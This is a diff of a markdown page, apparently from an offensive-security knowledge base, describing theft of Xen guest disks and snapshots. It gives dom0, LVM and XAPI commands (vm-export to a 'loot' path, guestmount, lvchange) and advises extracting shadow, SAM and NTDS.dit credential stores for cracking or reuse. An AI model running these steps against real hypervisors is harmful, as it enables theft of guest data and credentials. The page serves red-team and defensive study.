@@ -1,32 +1,46 @@
 ---
-title: "Disk and snapshot theft: reading Xen guest disks offline"
-description: "Stealing Xen guest data by reading virtual disks and snapshots from dom0 or the storage repository, whether LVM volumes, VHD files, or raw images, then mounting them offline to extract credentials and files without booting the guest."
+title: "Disk and snapshot theft: taking Xen guest virtual disks"
+description: "Xen guest disks are virtual block devices backed by files (raw, VHD) or block storage (LVM, local or shared SRs on XenServer/XCP-ng). With dom0, storage, or XAPI access, an attacker reads the backing image offline or exports the VDI, extracting any guest's data without entering it, and reads snapshots for point-in-time state."
 keywords:
-  - Xen disk
+  - vdi
+  - vhd
   - storage repository
-  - VHD
-  - LVM
-  - offline disk
+  - xen disk
+  - offline access
 ---
 
 # Disk and snapshot theft
 
-Xen guest disks live on a storage repository managed by dom0: LVM logical volumes, VHD files, or raw images depending on the storage type. With dom0 or storage access, exporting a virtual disk and mounting it offline exposes the guest filesystem, and snapshots capture point-in-time state.
+A Xen guest's disk is a virtual block device the backend maps from a backing store: on upstream Xen that is a file (raw or VHD) or a block device (an LVM volume); on XenServer/XCP-ng it is a Virtual Disk Image (VDI) in a Storage Repository (SR), which may be local or shared. Access to the backing store, through dom0, the storage, or XAPI, lets an attacker read the guest filesystem offline or export the VDI, taking the data with no login and no in-guest defenses, and snapshots give point-in-time copies.
+
+## Locate and read
 
 ```bash
-# XCP-ng/XenServer: export a virtual disk image
-xe vdi-list; xe vdi-export uuid=<vdi-uuid> filename=disk.raw format=raw
-# Mount offline to extract secrets
-qemu-nbd -r -c /dev/nbd0 disk.raw && mount -o ro /dev/nbd0p1 /mnt
+# upstream Xen: the backing file/device from the domain config
+grep -E 'disk|phy|file|vdev' /etc/xen/<guest>.cfg
+xenstore-ls /local/domain/<domid>/device/vbd 2>/dev/null
+guestmount -a /path/to/guest.img -i --ro /mnt/guest     # raw/VHD file
+# LVM-backed: activate and mount the volume
+lvs; lvchange -ay <vg>/<guest-lv>; guestmount -a /dev/<vg>/<guest-lv> -i --ro /mnt
+
+# XenServer/XCP-ng: export the VDI via XAPI (no dom0 file access needed)
+xe -s <host> -u root -pw <pw> vm-export vm=<name> filename=/loot/<name>.xva
+# or snapshot then export
+xe -s <host> -u root -pw <pw> vm-snapshot vm=<name> new-name-label=s
 ```
 
 ## Exploitation notes
 
-- Offline access sidesteps the guest OS: pull Linux shadow files or Windows `SAM`/`NTDS.dit`, then crack or reuse them.
-- On LVM-backed storage, the guest volume can be read directly from dom0 with standard tools once its name is known.
-- Snapshots and suspended-state files can contain memory, so they may hold secrets from a running guest.
+- The read method depends on the backing type: `guestmount`/`qemu-nbd` for file images, `lvchange -ay` then mount for LVM, and XAPI `vm-export`/VDI export for XenServer/XCP-ng SRs.
+- `vm-export` produces a portable XVA archive of the whole VM, a clean exfiltration path that needs only XAPI access, not dom0 file access.
+- Offline mounting bypasses all guest controls; prioritise credential stores as with any disk theft.
+- Snapshots capture point-in-time state; chain from [Host access and shell](host-access-and-shell.md) or the [Management plane](management-plane.md) for the required access.
+
+## Tools
+
+- [libguestfs / guestmount](https://libguestfs.org/)
 
 ## References
 
-- [XCP-ng: storage](https://docs.xcp-ng.org/storage/)
-- [Xen Project documentation](https://xenproject.org/help/documentation/)
+- [XenServer/XCP-ng storage and VDI export](https://docs.xcp-ng.org/)
+- [Xen disk configuration](https://xenbits.xen.org/docs/)
